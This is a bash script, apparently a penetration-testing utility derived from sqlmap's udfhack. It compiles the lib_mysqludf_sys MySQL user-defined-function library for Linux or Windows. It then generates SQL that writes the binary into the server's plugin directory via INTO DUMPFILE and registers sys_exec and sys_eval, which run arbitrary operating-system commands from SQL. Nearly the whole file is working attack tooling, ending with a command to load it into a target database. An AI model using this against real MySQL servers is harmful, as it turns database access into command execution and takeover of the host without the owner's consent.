#!/bin/bash

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

# Copyright Karim Kanso, 2020. All rights reserved. Licenced under GPLv3



# The code here is derived from:
# https://github.com/sqlmapproject/udfhack. However, it simplies the
# build and removes the need for MySQL development files to be
# installed.

if test "$#" -ne 3 -o \
        \( "$1" != "32" -a "$1" != "64" \) \
        -o \( "$2" != "win" -a "$2" != "linux" \) ; then
    echo "usage: $(basename $0) {32|64} {win|linux} plugin-dir"
    exit 1
fi

ARCH=$1
OS=$2
PLUGINDIR=$3

CFLAGS="-Wall -Wpedantic -Os -fPIC -shared -Wl,-s -std=c11"
BASENAME=lib_mysqludf_sys
NAME=${BASENAME}_${OS}_${ARCH}

if test "${OS}" = "linux"; then
    GCC=gcc
    CFLAGS="${CFLAGS} -m${ARCH}"
    EXT=.so
else
    if test "${ARCH}" = "32"; then
        GCC=i686-w64-mingw32-gcc
    else
        GCC=x86_64-w64-mingw32-gcc
    fi
    EXT=.dll
fi


set -e

echo "[*] building ${NAME}${EXT}"
${GCC} ${CFLAGS} -x c - -o ${NAME}${EXT} <<EOF
/*
  lib_mysqludf_sys - a library with miscellaneous (operating) system level functions
  Copyright (C) 2007  Roland Bouman
  Copyright (C) 2008-2010  Roland Bouman and Bernardo Damele A. G.
  web: http://www.mysqludf.org/
  email: mysqludfs@gmail.com, bernardo.damele@gmail.com

  This library is free software; you can redistribute it and/or
  modify it under the terms of the GNU Lesser General Public
  License as published by the Free Software Foundation; either
  version 2.1 of the License, or (at your option) any later version.

  This library is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  Lesser General Public License for more details.

  You should have received a copy of the GNU Lesser General Public
  License along with this library; if not, write to the Free Software
  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
*/


#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
  #define DLLEXP __declspec(dllexport)
  #include "windows.h"
  // my_ulonglong defined in my_global.h
  typedef unsigned __int64 my_ulonglong;
  typedef __int64 my_longlong;
  #define SETENV(name,value) SetEnvironmentVariable(name,value);
#else
  #define DLLEXP
  typedef unsigned long long my_ulonglong;
  typedef long long my_longlong;
  #define SETENV(name,value) setenv(name,value,1);
  #define _POSIX_C_SOURCE 200112L
  #include <stdlib.h>
#endif

#include <string.h>
#include <stdio.h>

// copied from mysql/plugin.h
typedef char my_bool;

// these are copied from mysql_com.h
enum Item_result {
  STRING_RESULT=0, REAL_RESULT, INT_RESULT, ROW_RESULT, DECIMAL_RESULT,
  TIME_RESULT
};

typedef struct st_udf_args {
  unsigned int arg_count;               /* Number of arguments */
  enum Item_result *arg_type;           /* Pointer to item_results */
  char **args;                          /* Pointer to argument */
  unsigned long *lengths;               /* Length of string arguments */
  char *maybe_null;                     /* Set to 1 for all maybe_null args */
  const char **attributes;              /* Pointer to attribute name */
  unsigned long *attribute_lengths;     /* Length of attribute arguments */
  void *extension;
} UDF_ARGS;

  /* This holds information about the result */
typedef struct st_udf_init {
  my_bool maybe_null;          /* 1 if function can return NULL */
  unsigned int decimals;       /* for real functions */
  unsigned long max_length;    /* For string functions */
  char *ptr;                   /* free pointer for function data */
  my_bool const_item;          /* 1 if function always returns the same value */
  void *extension;
} UDF_INIT;

#define LIBVERSION "lib_mysqludf_sys version 0.0.5"


/**
 * lib_mysqludf_sys_info
 */
DLLEXP
my_bool lib_mysqludf_sys_info_init(UDF_INIT *i, UDF_ARGS *a, char *m) {
  my_bool status;
  if(a->arg_count!=0){
    strcpy(m, "No arguments allowed (udf: lib_mysqludf_sys_info)");
    status = 1;
  } else {
    status = 0;
  }
  return status;
}

DLLEXP
void lib_mysqludf_sys_info_deinit(UDF_INIT *i) {}

DLLEXP
char* lib_mysqludf_sys_info(
    UDF_INIT *initid,
    UDF_ARGS *args,
    char* result,
    unsigned long* length,
    char *is_null,
    char *error
){
  strcpy(result, LIBVERSION);
  *length = strlen(LIBVERSION);
  return result;
}

DLLEXP
my_bool sys_get_init(UDF_INIT *i, UDF_ARGS *a, char *m){
  if(a->arg_count==1
     && a->arg_type[0]==STRING_RESULT
     && a->args[0]!=NULL){
    i->maybe_null = 1;
    return 0;
  } else {
    strcpy(m, "Expected exactly one string type parameter");
    return 1;
  }
}

DLLEXP
void sys_get_deinit(UDF_INIT *i) {}

DLLEXP
char* sys_get(
    UDF_INIT *initid,
    UDF_ARGS *args,
    char* result,
    unsigned long* length,
    char *is_null,
    char *error
){
  char* value = getenv(args->args[0]);
  if(value == NULL){
    *is_null = 1;
  } else {
    *length = strlen(value);
  }
  return value;
}

DLLEXP
my_bool sys_set_init(UDF_INIT *i, UDF_ARGS *a, char *m) {
  if(a->arg_count!=2){
    strcpy(m, "Expected exactly two arguments");
    return 1;
  }
  if(a->arg_type[0]!=STRING_RESULT){
    strcpy(m, "Expected string type for name parameter");
    return 1;
  }
  a->arg_type[1]=STRING_RESULT;
  if((i->ptr=malloc(
          a->lengths[0] + 1 + a->lengths[1] + 1
      ))==NULL){
    strcpy(m, "Could not allocate memory");
    return 1;
  }
  return 0;
}

DLLEXP
void sys_set_deinit(UDF_INIT *i) {
  if (i->ptr!=NULL){
    free(i->ptr);
  }
}

DLLEXP
long long sys_set(
    UDF_INIT *initid,
    UDF_ARGS *args,
    char *is_null,
    char *error
){
  char *name = initid->ptr;
  char *value = name + args->lengths[0] + 1;
  memcpy(
      name,
      args->args[0],
      args->lengths[0]
  );
  *(name + args->lengths[0]) = '\0';
  memcpy(
      value,
      args->args[1],
      args->lengths[1]
  );
  *(value + args->lengths[1]) = '\0';
  return SETENV(name,value);
}

DLLEXP
my_bool sys_exec_init(UDF_INIT *i, UDF_ARGS *a, char *m){
  if(a->arg_count == 1
     && a->arg_type[0]==STRING_RESULT
     && a->args[0] != NULL){
    return 0;
  } else {
    strcpy(m, "Expected exactly one string type parameter");
    return 1;
  }
}

DLLEXP
void sys_exec_deinit(UDF_INIT *i) {}

DLLEXP
my_ulonglong sys_exec(
    UDF_INIT *initid,
    UDF_ARGS *args,
    char *is_null,
    char *error
){
  return system(args->args[0]);
}

DLLEXP
my_bool sys_eval_init(UDF_INIT *i, UDF_ARGS *a, char *m) {
  if(a->arg_count == 1
     && a->arg_type[0]==STRING_RESULT
     && a->args[0] != NULL){
    return 0;
  } else {
    strcpy(m, "Expected exactly one string type parameter");
    return 1;
  }
}

void sys_eval_deinit(UDF_INIT *i) {}

char* sys_eval(
    UDF_INIT *initid,
    UDF_ARGS *args,
    char* result,
    unsigned long* length,
    char *is_null,
    char *error
){
  FILE *pipe;
  char *line;
  unsigned long outlen, linelen;

  line = (char *)malloc(1024);
  result = (char *)malloc(1);
  outlen = 0;

  result[0] = (char)0;

  pipe = popen(args->args[0], "r");

  while (fgets(line, sizeof(line), pipe) != NULL) {
    linelen = strlen(line);
    result = (char *)realloc(result, outlen + linelen);
    strncpy(result + outlen, line, linelen);
    outlen = outlen + linelen;
  }

  pclose(pipe);

  if (!(*result) || result == NULL) {
    *is_null = 1;
  } else {
    result[outlen-1] = 0x00;
    *length = strlen(result);
  }

  return result;
}
EOF

echo "[*] building ${NAME}.sql"
cat > ${NAME}.sql <<EOF
SET @lib = 0x$(xxd -p ${NAME}${EXT} | tr -d '\n');
SELECT BINARY @lib INTO DUMPFILE '${PLUGINDIR}/${NAME}${EXT}';

DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;
DROP FUNCTION IF EXISTS sys_get;
DROP FUNCTION IF EXISTS sys_set;
DROP FUNCTION IF EXISTS sys_exec;
DROP FUNCTION IF EXISTS sys_eval;

CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME '${NAME}${EXT}';
CREATE FUNCTION sys_get               RETURNS string SONAME '${NAME}${EXT}';
CREATE FUNCTION sys_set               RETURNS int    SONAME '${NAME}${EXT}';
CREATE FUNCTION sys_exec              RETURNS int    SONAME '${NAME}${EXT}';
CREATE FUNCTION sys_eval              RETURNS string SONAME '${NAME}${EXT}';
EOF

echo "[*] done, now load into mysql:"
echo "[*]   mysql -h xx.xx.xx.xx -u user -ppassword mysql < ${NAME}.sql"
